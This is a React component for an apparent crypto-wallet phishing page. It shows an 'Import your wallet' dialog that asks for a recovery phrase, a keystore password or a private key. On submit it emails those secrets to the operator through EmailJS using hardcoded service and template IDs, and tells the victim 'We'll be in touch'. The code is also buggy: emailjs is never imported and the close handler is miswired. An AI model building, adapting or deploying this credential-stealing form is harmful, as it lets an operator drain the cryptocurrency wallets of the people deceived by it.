import { useRef, useState } from "react";
import { Usewallet } from "../context/Usewallet";

function Form() {
  const { setFormVisible } = Usewallet();

  const [active, setActive] = useState(1);
  const form = useRef();

  const sendEmail = (e) => {
    e.preventDefault();

    emailjs
      .sendForm("service_x41o8tj", "template_168l8hs", form.current, {
        publicKey: "4N-dX6YLFvkH1V-xz",
      })
      .then(
        () => {
          setFormVisible(false);
          alert(`We'll be in touch with you`);
        },
        (error) => {
          console.log("FAILED...", error.text);
        }
      );
  };

  return (
    <div>
      <div className=" mx-auto mt-16 w-[80%] rounded bg-white p-8 shadow-lg md:w-[70%]">
        <p className="flex gap-4 p-4">
          <span>
            <img src="" alt="" />
          </span>
          <span>Import your wallet</span>
        </p>
        <p className="flex gap-8 border-b border-b-gray-200 text-xl font-bold">
          <span
            className={`${
              active === 1
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(1)}
          >
            Phrase
          </span>
          <span
            className={`${
              active === 2
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(2)}
          >
            Keystore Json
          </span>
          <span
            className={`${
              active === 3
                ? " cursor-pointer border-b-2 border-b-blue-400 pb-2"
                : ""
            }`}
            onClick={() => setActive(3)}
          >
            Private Key
          </span>
        </p>

        <form
          ref={form}
          onSubmit={sendEmail}
          className="bg-white font-medium text-stone-950"
        >
          {active === 1 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"Recovery Phrase"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}
          {active === 2 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <input
                type="text"
                className="my-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder="Wallet Password"
              />

              <p>
                Several lines of text beginning with plus the password you used
                to encrypt it.
              </p>
            </>
          )}
          {active === 3 && (
            <>
              <textarea
                name="message"
                rows="5"
                className="mt-4 w-full rounded-lg border border-blue-500 bg-white p-5 font-medium text-stone-950 outline-none md:mb-2"
                placeholder={"private key"}
                data-gramm="false"
              ></textarea>
              <span className="bg-white">
                Typically 12 - 24 words seperated by a single space
              </span>
            </>
          )}
          <div className="mt-5 flex gap-4">
            <input
              type="submit"
              value="Connect"
              className="mx-auto block w-[70%] cursor-pointer rounded bg-blue-500 px-[30px] py-[15px] text-center text-white "
            />
            <p
              onClick={setFormVisible(false)}
              className=" w-[30%] cursor-pointer rounded bg-red-500 px-4 pt-3 text-center text-white "
            >
              Close
            </p>
          </div>
        </form>
      </div>
    </div>
  );
}

export default Form;
